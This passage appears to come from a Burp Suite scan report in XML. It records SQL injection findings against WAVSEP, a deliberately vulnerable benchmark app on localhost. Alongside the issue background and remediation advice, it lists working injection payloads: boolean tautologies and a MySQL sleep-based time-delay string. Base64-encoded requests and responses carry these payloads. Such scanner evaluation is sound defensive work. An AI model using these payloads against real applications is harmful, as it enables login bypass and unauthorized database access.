      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL0Nhc2UwNy1JbmplY3Rpb25JblVwZGF0ZS1OdW1lcmljV2l0aG91dFF1b3Rlcy1UaW1lRGVsYXlFeHBsb2l0LTIwMElkZW50aWNhbC5qc3A/dHJhbnNhY3Rpb25JZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBJZGVudGljYWwvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU5OjIxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDcNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDcgLSBJbmplY3Rpb24gaW50byBhIG51bWVyaWMgdmFsdWUgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBxdW90ZSB2YWxpZGF0aW9uIGFuZCBpZGVudGljYWwgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjAKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3270461382241509376</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp [password parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>password</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>82126138' or '7100'='7100</b> and <b>85525356' or '7363'='7370</b> were each submitted in the password parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the password parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZSZwYXNzd29yZD10ZXh0dmFsdWUyODIxMjYxMzgnJTIwb3IlMjAnNzEwMCclM2QnNzEwMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpoZWxsbyB1c2VyMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZSZwYXNzd29yZD10ZXh0dmFsdWUyODU1MjUzNTYnJTIwb3IlMjAnNzM2MyclM2QnNzM3MCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzgNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZSZwYXNzd29yZD10ZXh0dmFsdWUyJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzgNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1824616427487723520</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>88808725' or 3412=3412-- </b> and <b>88787608' or 5598=5607-- </b> were each submitted in the username parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZTg4ODA4NzI1JyUyMG9yJTIwMzQxMiUzZDM0MTItLSUyMCZwYXNzd29yZD10ZXh0dmFsdWUyIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjM2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpoZWxsbyB1c2VyMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZTg4Nzg3NjA4JyUyMG9yJTIwNTU5OCUzZDU2MDctLSUyMCZwYXNzd29yZD10ZXh0dmFsdWUyIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjM2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzgNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
